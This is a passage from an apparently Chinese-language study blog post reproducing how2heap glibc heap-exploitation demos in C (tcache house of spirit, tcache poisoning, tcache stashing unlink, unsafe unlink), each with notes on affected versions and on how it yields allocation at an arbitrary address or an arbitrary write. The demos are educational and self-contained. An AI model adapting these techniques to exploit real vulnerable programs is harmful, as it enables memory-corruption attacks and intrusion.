class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>址</p>
<h3 id="漏洞成因-11"><a href="#漏洞成因-11" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-11"><a href="#适用范围-11" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-11"><a href="#利用原理-11" class="headerlink" title="利用原理"></a>利用原理</h3><ul>
<li><p>这个demo演示了house of spirit在tcache上</p>
</li>
<li><p>首先malloc(1)</p>
</li>
<li><p>接着我们在栈上伪造个chunk，size为0x40。因为在tcache_put()中没有对下一个chunk的size进行检查，所以不需要伪造下一个chunk</p>
</li>
<li><p>然后我们free这个chunk，再将其申请出来即可得到伪造的chunk，若为我们还伪造了它的fd，就可以申请其他的地</p>
</li>
</ul>
<h3 id="相关技巧-11"><a href="#相关技巧-11" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-11"><a href="#利用效果-11" class="headerlink" title="利用效果"></a>利用效果</h3><p>分配一个chunk到栈上</p>
<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><p>效果：任意地址分配</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	assert((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-12"><a href="#漏洞成因-12" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-12"><a href="#适用范围-12" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-12"><a href="#利用原理-12" class="headerlink" title="利用原理"></a>利用原理</h3><p>此技巧就是通过溢出等漏洞修改tcache链表上的next指针</p>
<ul>
<li><p>我们需要tcachebin中有两个chunk，a b</p>
</li>
<li><p>free(a);free(b);</p>
</li>
<li><p>通过溢出等修改tcachebin链表头部(如b-&gt;a，b就是头部)的next指针，为&amp;stack_var</p>
</li>
<li><p>连续申请俩次就可以申请出栈上的那块内存</p>
</li>
</ul>
<h3 id="相关技巧-12"><a href="#相关技巧-12" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-12"><a href="#利用效果-12" class="headerlink" title="利用效果"></a>利用效果</h3><p>任意地址分配</p>
<h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-13"><a href="#漏洞成因-13" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-13"><a href="#适用范围-13" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-13"><a href="#利用原理-13" class="headerlink" title="利用原理"></a>利用原理</h3><p>关于smallbin的攻击，必须有至少一次calloc()分配</p>
<ol>
<li>申请 9 个 chunk，释放chunk3 - chunk8 和chunk1，他们会被放入 tcache bin中。然后再释放 chunk0 和 chunk2，会被放入 unsortedbin中（连着释放7个会被合并）；</li>
<li>申请一个 大于 上述 chunk size (0x90)的chunk，unsortedbin 中的chunk0 和 chunk2 会被放入 small bin中；</li>
<li>申请两个 tcache，此时 tcache 中的 剩余 chunk数量 为 5 个；</li>
<li>修改 chunk 2 的 <strong>bk指针</strong> 指向我们伪造的内存地址 chunk，<u>该内存地址的chunk 的 bk 指针要为一个 可写入的地址</u>；</li>
</ol>
<p>此时smallbin bk处如：<code>BK: 0x564523298290(chunk 0) —▸ 0x5645232983d0(chunk2) —▸ 0x7fff26072120 —▸ 0x7fff26072130 ◂— 0</code></p>
<ol start="5">
<li><p>调用 calloc() 申请 与tcache 同大小的 chunk，会直接从 small bin中 取 chunk0；</p>
</li>
<li><p>此时small bin 中剩余的 chunk2-&gt; fake chunk，会<strong>从后向前 加入</strong> tcache中，而且由于此时tcache 仅剩2个空余，所以只会遍历到 fake chunk就会结束。</p>
</li>
<li><p>经过上述操作后，此时 tcache链中 第一个 chunk 是 fake chunk，我们取出即可。</p>
</li>
</ol>
<h3 id="相关技巧-13"><a href="#相关技巧-13" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-13"><a href="#利用效果-13" class="headerlink" title="利用效果"></a>利用效果</h3><p>向任意地址写入libc地址，任意地址分配</p>
<h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 20.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line">	<span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n&quot;</span>,(<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink_chunk function at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=1ecba1fafc160ca70f81211b23f688df8676e612\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line">	<span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242L</span>L;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	assert(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242L</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-14"><a href="#漏洞成因-14" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-14"><a href="#适用范围-14" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-14"><a href="#利用原理-14" class="headerlink" title="利用原理"></a>利用原理</h3><p>malloc_size &#x3D; 0x420;要足够大不使用tcache和fastbin</p>
<p>chunk0_ptr &#x3D; malloc(malloc_size)<br>		chunk1_ptr &#x3D; malloc(malloc_size)</p>
<p>接着我们再chunk0里伪造一个fake_chunk</p>
<p>size&#x3D;chunk1_ptr的size-0x10<br>		fd&#x3D;chunk0_ptr的地址-0x18<br>		bk&#x3D;chunk0_ptr的地址-0x10<br>（特别注意这里是chunk0_ptr地址，地址上存的才是堆的地址）</p>
<p>现在假设chunk0中存在溢出，我们可以随意改chunk1的值，接着我们改chunk1的prev_size为0x420，size的use位设为0</p>
<p>然后我们释放chunk1，就能触发unlink，向后合并</p>
<p>现在chunk0的指针指向自己了</p>
<p>然后我们可以通过释放这个指针两次doublefree造成任意地址写任意值</p>
<p>（不过libc2.32就有新的防御，新的防御机制-safe-linking(异或加密),其核心思想是:将指针的地址右移12位再和指针本身异或，这种unlink用不了啦</p>
<h3 id="相关技巧-14"><a href="#相关技巧-14" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-14"><a href="#利用效果-14" class="headerlink" title="利用效果"></a>利用效果</h3><p>任意地址分配</p>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>leon
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="http://example.com/2025/04/25/how2heap/" title="how2heap">http://example.com/2025/04/25/how2heap/</a>
  </li>
  <li class="post-copyright-license">
      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
